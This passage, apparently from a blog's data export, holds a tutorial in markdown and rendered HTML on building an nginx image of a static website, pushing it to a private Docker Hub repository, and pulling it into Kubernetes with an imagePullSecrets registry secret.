v1.23.1\nworker1   Ready    <none>                 77d   v1.23.1\n```\nLet's create a namespace for this demo ! \n\n```bash command line prompt \nraf@4n6nk8s:~$ kubectl create ns private-docker\nnamespace/private-docker created\n```\nTo make our cluster pull private images we need to create a special secret object with specific type called `docker-registry` secret. To make this secret work correctly you must specify the docker registry, username , password and docker email!\n\nI prefer to put this params in variable environment to work with it easly \n```bash command line prompt \nexport EMAIL=<email>\nexport USERNAME=<user_name>\nexport PASSWORD=<password>\nexport SERVER=<docker_registry>\n```\nIn case you will use dockerhub as your registry you don't have to specify the server !\n\n```\nraf@4n6nk8s:~$ kubectl create -n private-docker secret docker-registry docker-secret --docker-username=$USERNAME --docker-password=$PASSWORD --docker-email=$EMAIL\nsecret/docker-secret created\n```\n\nNow let's create a pod with the image that we made it ! \n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: cars-app-pod\n  name: cars-app-pod\n  namespace: private-docker\nspec:\n  containers:\n  - image: <user_name>/cars-app\n    name: cars-app-pod\n    resources: {}\n  dnsPolicy: ClusterFirst\n  restartPolicy: Always\nstatus: {}\n```\nIf you try create this pod with this YAML definition you'll get a `ErrImagePull` because we don't specify the docker secret that we created \n```bash command line prompt\nraf@4n6nk8s:~$ kubectl get pods -n private-docker\nNAME           READY   STATUS         RESTARTS   AGE\ncars-app-pod   0/1     ErrImagePull   0          5s\n```\nLet's figure out the problem with `kubectl describe` command. Take a look at the events that occur when the pod try to pull the container image!\n```\n Events:\n  Type     Reason          Age                From               Message\n  ----     ------          ----               ----               -------\n  Normal   Scheduled       44s                default-scheduler  Successfully assigned private-docker/cars-app-pod to worker1\n  Normal   SandboxChanged  40s                kubelet            Pod sandbox changed, it will be killed and re-created.\n  Normal   Pulling         26s (x2 over 43s)  kubelet            Pulling image \"<user_name>/cars-app\"\n  Warning  Failed          23s (x2 over 40s)  kubelet            Failed to pull image \"<user_name>/cars-app\": rpc error: code = Unknown desc = Error response from daemon: pull access denied for <user_name>/cars-app, repository does not exist or may require 'docker login': denied: requested access to the resource is denied\n  Warning  Failed          23s (x2 over 40s)  kubelet            Error: ErrImagePull\n  Normal   BackOff         12s (x4 over 39s)  kubelet            Back-off pulling image \"<user_name>/cars-app\"\n  Warning  Failed          12s (x4 over 39s)  kubelet            Error: ImagePullBackOff\n\n```\nSpecifying the docker secret in the pod YAML definition will solve this problem. The pod will pull the container image without any problem\nAdding `imagePullSecrets` attributes in the `spec` of the pod allow the pod to pull this image. The Final YAML definition will be similar to the following one ! \n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: cars-app-pod\n  name: cars-app-pod\n  namespace: private-docker\nspec:\n  containers:\n  - image: <user_name>/cars-app\n    name: cars-app-pod\n    resources: {}\n  imagePullSecrets:\n  - name: docker-secret\n  dnsPolicy: ClusterFirst\n  restartPolicy: Always\nstatus: {}\n```\nCreate the pod again and check it with `kubectl get pods` and don't forget to specify the namespace!\n\n``` bash command line prompt\nraf@4n6nk8s:~$ kubectl get pods -n private-docker\nNAME           READY   STATUS    RESTARTS   AGE\ncars-app-pod   1/1     Running   0          4s\n```\nI want to make sure that everything is ok, so i will expose this pod using the NodePort service. The following service YAML Definition will expose the pod correctly :\n```yaml yaml\napiVersion: v1\nkind: Service\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: cars-app-pod\n  name: cars-app-pod\n  namespace: private-docker\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: cars-app-pod\n  type: NodePort\n```\nLet's now check the service and get the node port that we will use it to test the pod\n```bash command line prompt \nraf@4n6nk8s:~$ kubectl get svc -n private-docker\nNAME           TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\ncars-app-pod   NodePort   10.111.98.22   <none>        80:31651/TCP   6s\n```\nNow you can visit either http://master:31651 or http://worker1:31651 and you will find the static website work without any problem!\n\n![](https://imgur.com/3TVOl36.png)\n","source":"_posts/Kubernetes/private-docker-k8s.md","raw":"---\ntitle: Dockerize a website & Pull it privately in k8s\ndate: 2022-09-08 01:47:58\ntags: kubernetes\ncover: https://res.cloudinary.com/practicaldev/image/fetch/s--ne7pa20x--/c_imagga_scale,f_auto,fl_progressive,h_900,q_auto,w_1600/https://thepracticaldev.s3.amazonaws.com/i/7xyqmfvmadyqu2girucz.jpg\ncategories:\n- [Kubernetes]\n---\n\nIn this article you will learn how to containerize a static website using nginx. Then we will push a private docker image in dockerhub. Finally we will use this private image to be pulled in our Kubernetes cluster ! I will split this article to 2 small and easy steps, you can skip any one you want !\n\n# Containerize a static website and push it on dockerhub\nIn this Section we will choose a template from random websites that provides free css templates, then we will dockerize it !\n\n## Dockerize the website\n\nI'll choose this template from this [link](https://www.free-css.com/free-css-templates/page282/royal-cars)\n![](https://imgur.com/ngHGyw0.png)\n\nDownload it and let's create our Dockerfile ! \nWe will use the `nginx:alpine` image and copy all the assets of the website to the `/usr/share/nginx/html` to be hosted by the nginx webserver. \n\n```Dockerfile\nFROM nginx:alpine\nWORKDIR /usr/share/nginx/html\nRUN rm -rf ./*\nCOPY ./ ./\nRUN chmod +r -R . \nENTRYPOINT [\"nginx\",\"-g\",\"daemon off;\"]\n```\nNow it's time to build the container image \n\n```bash command line prompt\nraf@4n6nk8s:~$ sudo docker build . -t <user_name>/cars-app\nSending build context to Docker daemon  2.454MB\nStep 1/5 : FROM nginx:alpine\nalpine: Pulling from library/nginx\n213ec9aee27d: Downloading [===================================>               ]  2.018MB/2.806MB\n2546ae67167b: Downloading [=========>                                         ]  1.461MB/7.403MB\n23b845224e13: Download complete\n9bd5732789a3: Download complete\n328309e59ded: Waiting\nb231d02e5150: Waiting\n```\nNow let's create a container to test it before make push it! \n\n```bash command line prompt\nraf@4n6nk8s:~$ sudo docker run --name car-demo -p 8686:80 <user_name>/cars-app\n2022/09/08 22:53:47 [notice] 1#1: using the \"epoll\" event method\n2022/09/08 22:53:47 [notice] 1#1: nginx/1.23.1\n2022/09/08 22:53:47 [notice] 1#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219)\n2022/09/08 22:53:47 [notice] 1#1: OS: Linux 5.15.0-41-generic\n2022/09/08 22:53:47 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576\n2022/09/08 22:53:47 [notice] 1#1: start worker processes\n2022/09/08 22:53:47 [notice] 1#1: start worker process 7\n2022/09/08 22:53:47 [notice] 1#1: start worker process 8\n2022/09/08 22:53:47 [notice] 1#1: start worker process 9\n2022/09/08 22:53:47 [notice] 1#1: start worker process 10\n```\nSanity Check please ! Oh everything is OK !\n\n![](https://imgur.com/nQ6NcxG.png)\n\n## Push the container image to private repo\n\nNow go and create a private repository in your dockerhub to push it ! \n```bash command line prompt\nraf@4n6nk8s:~$ sudo docker image push <user_name>/cars-app\nUsing default tag: latest\nThe push refers to repository [docker.io/<user_name>/cars-app]\n41c30355eff8: Pushed\nf2ba5e032e84: Pushed\n43e1f37b87cb: Pushed\nbf4e176a4d9b: Mounted from library/nginx\na1d571e4e83d: Mounted from library/nginx\n6d97b4d00719: Mounted from library/nginx\n2a7647ca3937: Mounted from library/nginx\n549c42eea4a6: Mounted from library/nginx\n994393dc58e7: Mounted from library/nginx\n```\nNow it's time to deal with our kubernetes cluster ! \n\n# Use the private docker image in Kubernetes\n\nIn this demo I will use a production kubernetes cluster with 1 master node and 1 worker node \n\n```bash command line prompt \nraf@4n6nk8s:~$ kubectl get nodes\nNAME      STATUS   ROLES                  AGE   VERSION\nmaster    Ready    control-plane,master   77d   v1.23.1\nworker1   Ready    <none>                 77d   v1.23.1\n```\nLet's create a namespace for this demo ! \n\n```bash command line prompt \nraf@4n6nk8s:~$ kubectl create ns private-docker\nnamespace/private-docker created\n```\nTo make our cluster pull private images we need to create a special secret object with specific type called `docker-registry` secret. To make this secret work correctly you must specify the docker registry, username , password and docker email!\n\nI prefer to put this params in variable environment to work with it easly \n```bash command line prompt \nexport EMAIL=<email>\nexport USERNAME=<user_name>\nexport PASSWORD=<password>\nexport SERVER=<docker_registry>\n```\nIn case you will use dockerhub as your registry you don't have to specify the server !\n\n```\nraf@4n6nk8s:~$ kubectl create -n private-docker secret docker-registry docker-secret --docker-username=$USERNAME --docker-password=$PASSWORD --docker-email=$EMAIL\nsecret/docker-secret created\n```\n\nNow let's create a pod with the image that we made it ! \n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: cars-app-pod\n  name: cars-app-pod\n  namespace: private-docker\nspec:\n  containers:\n  - image: <user_name>/cars-app\n    name: cars-app-pod\n    resources: {}\n  dnsPolicy: ClusterFirst\n  restartPolicy: Always\nstatus: {}\n```\nIf you try create this pod with this YAML definition you'll get a `ErrImagePull` because we don't specify the docker secret that we created \n```bash command line prompt\nraf@4n6nk8s:~$ kubectl get pods -n private-docker\nNAME           READY   STATUS         RESTARTS   AGE\ncars-app-pod   0/1     ErrImagePull   0          5s\n```\nLet's figure out the problem with `kubectl describe` command. Take a look at the events that occur when the pod try to pull the container image!\n```\n Events:\n  Type     Reason          Age                From               Message\n  ----     ------          ----               ----               -------\n  Normal   Scheduled       44s                default-scheduler  Successfully assigned private-docker/cars-app-pod to worker1\n  Normal   SandboxChanged  40s                kubelet            Pod sandbox changed, it will be killed and re-created.\n  Normal   Pulling         26s (x2 over 43s)  kubelet            Pulling image \"<user_name>/cars-app\"\n  Warning  Failed          23s (x2 over 40s)  kubelet            Failed to pull image \"<user_name>/cars-app\": rpc error: code = Unknown desc = Error response from daemon: pull access denied for <user_name>/cars-app, repository does not exist or may require 'docker login': denied: requested access to the resource is denied\n  Warning  Failed          23s (x2 over 40s)  kubelet            Error: ErrImagePull\n  Normal   BackOff         12s (x4 over 39s)  kubelet            Back-off pulling image \"<user_name>/cars-app\"\n  Warning  Failed          12s (x4 over 39s)  kubelet            Error: ImagePullBackOff\n\n```\nSpecifying the docker secret in the pod YAML definition will solve this problem. The pod will pull the container image without any problem\nAdding `imagePullSecrets` attributes in the `spec` of the pod allow the pod to pull this image. The Final YAML definition will be similar to the following one ! \n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: cars-app-pod\n  name: cars-app-pod\n  namespace: private-docker\nspec:\n  containers:\n  - image: <user_name>/cars-app\n    name: cars-app-pod\n    resources: {}\n  imagePullSecrets:\n  - name: docker-secret\n  dnsPolicy: ClusterFirst\n  restartPolicy: Always\nstatus: {}\n```\nCreate the pod again and check it with `kubectl get pods` and don't forget to specify the namespace!\n\n``` bash command line prompt\nraf@4n6nk8s:~$ kubectl get pods -n private-docker\nNAME           READY   STATUS    RESTARTS   AGE\ncars-app-pod   1/1     Running   0          4s\n```\nI want to make sure that everything is ok, so i will expose this pod using the NodePort service. The following service YAML Definition will expose the pod correctly :\n```yaml yaml\napiVersion: v1\nkind: Service\nmetadata:\n  creationTimestamp: null\n  labels:\n    run: cars-app-pod\n  name: cars-app-pod\n  namespace: private-docker\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: cars-app-pod\n  type: NodePort\n```\nLet's now check the service and get the node port that we will use it to test the pod\n```bash command line prompt \nraf@4n6nk8s:~$ kubectl get svc -n private-docker\nNAME           TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\ncars-app-pod   NodePort   10.111.98.22   <none>        80:31651/TCP   6s\n```\nNow you can visit either http://master:31651 or http://worker1:31651 and you will find the static website work without any problem!\n\n![](https://imgur.com/3TVOl36.png)\n","slug":"Kubernetes/private-docker-k8s","published":1,"updated":"2023-03-23T17:35:09.768Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clfzirxnq000id5qfdcm89lua","content":"<p>In this article you will learn how to containerize a static website using nginx. Then we will push a private docker image in dockerhub. Finally we will use this private image to be pulled in our Kubernetes cluster ! I will split this article to 2 small and easy steps, you can skip any one you want !</p>\n<h1 id=\"containerize-a-static-website-and-push-it-on-dockerhub\"><a class=\"markdownIt-Anchor\" href=\"#containerize-a-static-website-and-push-it-on-dockerhub\">#</a> Containerize a static website and push it on dockerhub</h1>\n<p>In this Section we will choose a template from random websites that provides free css templates, then we will dockerize it !</p>\n<h2 id=\"dockerize-the-website\"><a class=\"markdownIt-Anchor\" href=\"#dockerize-the-website\">#</a> Dockerize the website</h2>\n<p>I’ll choose this template from this <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZS1jc3MuY29tL2ZyZWUtY3NzLXRlbXBsYXRlcy9wYWdlMjgyL3JveWFsLWNhcnM=\">link</span><br>\n<img data-src=\"https://imgur.com/ngHGyw0.png\" alt=\"\"></p>\n<p>Download it and let’s create our Dockerfile !<br>\nWe will use the  <code>nginx:alpine</code>  image and copy all the assets of the website to the  <code>/usr/share/nginx/html</code>  to be hosted by the nginx webserver.</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> nginx:alpine</span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/share/nginx/html</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">rm</span> -rf ./*</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./ ./</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +r -R . </span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> [<span class=\"string\">&quot;nginx&quot;</span>,<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;daemon off;&quot;</span>]</span></span><br></pre></td></tr></table></figure>\n<p>Now it’s time to build the container image</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker build . -t &lt;user_name&gt;/cars-app</span><br><span class=\"line\">Sending build context to Docker daemon  2.454MB</span><br><span class=\"line\">Step 1/5 : FROM nginx:alpine</span><br><span class=\"line\">alpine: Pulling from library/nginx</span><br><span class=\"line\">213ec9aee27d: Downloading [===================================&gt;               ]  2.018MB/2.806MB</span><br><span class=\"line\">2546ae67167b: Downloading [=========&gt;                                         ]  1.461MB/7.403MB</span><br><span class=\"line\">23b845224e13: Download complete</span><br><span class=\"line\">9bd5732789a3: Download complete</span><br><span class=\"line\">328309e59ded: Waiting</span><br><span class=\"line\">b231d02e5150: Waiting</span><br></pre></td></tr></table></figure>\n<p>Now let’s create a container to test it before make push it!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker run --name car-demo -p 8686:80 &lt;user_name&gt;/cars-app</span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: using the &quot;epoll&quot; event method</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: nginx/1.23.1</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219)</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: OS: Linux 5.15.0-41-generic</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker processes</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 7</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 8</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 9</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 10</span></span><br></pre></td></tr></table></figure>\n<p>Sanity Check please ! Oh everything is OK !</p>\n<p><img data-src=\"https://imgur.com/nQ6NcxG.png\" alt=\"\"></p>\n<h2 id=\"push-the-container-image-to-private-repo\"><a class=\"markdownIt-Anchor\" href=\"#push-the-container-image-to-private-repo\">#</a> Push the container image to private repo</h2>\n<p>Now go and create a private repository in your dockerhub to push it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker image push &lt;user_name&gt;/cars-app</span><br><span class=\"line\">Using default tag: latest</span><br><span class=\"line\">The push refers to repository [docker.io/&lt;user_name&gt;/cars-app]</span><br><span class=\"line\">41c30355eff8: Pushed</span><br><span class=\"line\">f2ba5e032e84: Pushed</span><br><span class=\"line\">43e1f37b87cb: Pushed</span><br><span class=\"line\">bf4e176a4d9b: Mounted from library/nginx</span><br><span class=\"line\">a1d571e4e83d: Mounted from library/nginx</span><br><span class=\"line\">6d97b4d00719: Mounted from library/nginx</span><br><span class=\"line\">2a7647ca3937: Mounted from library/nginx</span><br><span class=\"line\">549c42eea4a6: Mounted from library/nginx</span><br><span class=\"line\">994393dc58e7: Mounted from library/nginx</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to deal with our kubernetes cluster !</p>\n<h1 id=\"use-the-private-docker-image-in-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#use-the-private-docker-image-in-kubernetes\">#</a> Use the private docker image in Kubernetes</h1>\n<p>In this demo I will use a production kubernetes cluster with 1 master node and 1 worker node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get nodes</span><br><span class=\"line\">NAME      STATUS   ROLES                  AGE   VERSION</span><br><span class=\"line\">master    Ready    control-plane,master   77d   v1.23.1</span><br><span class=\"line\">worker1   Ready    &lt;none&gt;                 77d   v1.23.1</span><br></pre></td></tr></table></figure>\n<p>Let’s create a namespace for this demo !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl create ns private-docker</span><br><span class=\"line\">namespace/private-docker created</span><br></pre></td></tr></table></figure>\n<p>To make our cluster pull private images we need to create a special secret object with specific type called  <code>docker-registry</code>  secret. To make this secret work correctly you must specify the docker registry, username , password and docker email!</p>\n<p>I prefer to put this params in variable environment to work with it easly</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> EMAIL=&lt;email&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> USERNAME=&lt;user_name&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> PASSWORD=&lt;password&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> SERVER=&lt;docker_registry&gt;</span><br></pre></td></tr></table></figure>\n<p>In case you will use dockerhub as your registry you don’t have to specify the server !</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl create -n private-docker secret docker-registry docker-secret --docker-username=$USERNAME --docker-password=$PASSWORD --docker-email=$EMAIL</span><br><span class=\"line\">secret/docker-secret created</span><br></pre></td></tr></table></figure>\n<p>Now let’s create a pod with the image that we made it !</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">&lt;user_name&gt;/cars-app</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">    <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">dnsPolicy:</span> <span class=\"string\">ClusterFirst</span></span><br><span class=\"line\">  <span class=\"attr\">restartPolicy:</span> <span class=\"string\">Always</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>If you try create this pod with this YAML definition you’ll get a  <code>ErrImagePull</code>  because we don’t specify the docker secret that we created</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get pods -n private-docker</span><br><span class=\"line\">NAME           READY   STATUS         RESTARTS   AGE</span><br><span class=\"line\">cars-app-pod   0/1     ErrImagePull   0          5s</span><br></pre></td></tr></table></figure>\n<p>Let’s figure out the problem with  <code>kubectl describe</code>  command. Take a look at the events that occur when the pod try to pull the container image!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Events:</span><br><span class=\"line\"> Type     Reason          Age                From               Message</span><br><span class=\"line\"> ----     ------          ----               ----               -------</span><br><span class=\"line\"> Normal   Scheduled       44s                default-scheduler  Successfully assigned private-docker/cars-app-pod to worker1</span><br><span class=\"line\"> Normal   SandboxChanged  40s                kubelet            Pod sandbox changed, it will be killed and re-created.</span><br><span class=\"line\"> Normal   Pulling         26s (x2 over 43s)  kubelet            Pulling image &quot;&lt;user_name&gt;/cars-app&quot;</span><br><span class=\"line\"> Warning  Failed          23s (x2 over 40s)  kubelet            Failed to pull image &quot;&lt;user_name&gt;/cars-app&quot;: rpc error: code = Unknown desc = Error response from daemon: pull access denied for &lt;user_name&gt;/cars-app, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied</span><br><span class=\"line\"> Warning  Failed          23s (x2 over 40s)  kubelet            Error: ErrImagePull</span><br><span class=\"line\"> Normal   BackOff         12s (x4 over 39s)  kubelet            Back-off pulling image &quot;&lt;user_name&gt;/cars-app&quot;</span><br><span class=\"line\"> Warning  Failed          12s (x4 over 39s)  kubelet            Error: ImagePullBackOff</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Specifying the docker secret in the pod YAML definition will solve this problem. The pod will pull the container image without any problem<br>\nAdding  <code>imagePullSecrets</code>  attributes in the  <code>spec</code>  of the pod allow the pod to pull this image. The Final YAML definition will be similar to the following one !</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">&lt;user_name&gt;/cars-app</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">    <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">imagePullSecrets:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">docker-secret</span></span><br><span class=\"line\">  <span class=\"attr\">dnsPolicy:</span> <span class=\"string\">ClusterFirst</span></span><br><span class=\"line\">  <span class=\"attr\">restartPolicy:</span> <span class=\"string\">Always</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>Create the pod again and check it with  <code>kubectl get pods</code>  and don’t forget to specify the namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get pods -n private-docker</span><br><span class=\"line\">NAME           READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">cars-app-pod   1/1     Running   0          4s</span><br></pre></td></tr></table></figure>\n<p>I want to make sure that everything is ok, so i will expose this pod using the NodePort service. The following service YAML Definition will expose the pod correctly :</p>\n<figure class=\"highlight yaml\"><figcaption><span>yaml</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span 